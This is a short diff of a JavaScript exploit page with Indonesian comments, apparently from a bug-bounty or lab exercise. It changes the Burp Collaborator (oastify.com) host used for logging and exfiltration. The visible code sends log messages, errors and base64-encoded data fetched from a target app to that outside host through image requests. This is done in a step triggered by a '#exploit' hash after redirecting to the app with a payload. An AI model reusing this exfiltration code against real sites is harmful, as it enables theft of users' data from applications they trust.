@@ -8,7 +8,7 @@
 <script>
 // logger ke burp
 function log(msg){
-    new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?log=" + msg;
+    new Image().src = "https://9dnbwd4cnhlczqlmdz8azawh3893xyln.oastify.com/?log=" + msg;
 }
 
 // STEP 1: redirect ke app dengan payload kita
@@ -34,11 +34,11 @@ if (window.location.hash === "#exploit") {
     .then(d => {
 
         // exfiltrate via image (no CORS issue)
-        new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?data=" + btoa(d);
+        new Image().src = "https://9dnbwd4cnhlczqlmdz8azawh3893xyln.oastify.com/?data=" + btoa(d);
 
     })
     .catch(e => {
-        new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?error=" + e;
+        new Image().src = "https://9dnbwd4cnhlczqlmdz8azawh3893xyln.oastify.com/?error=" + e;
     });
 
 }
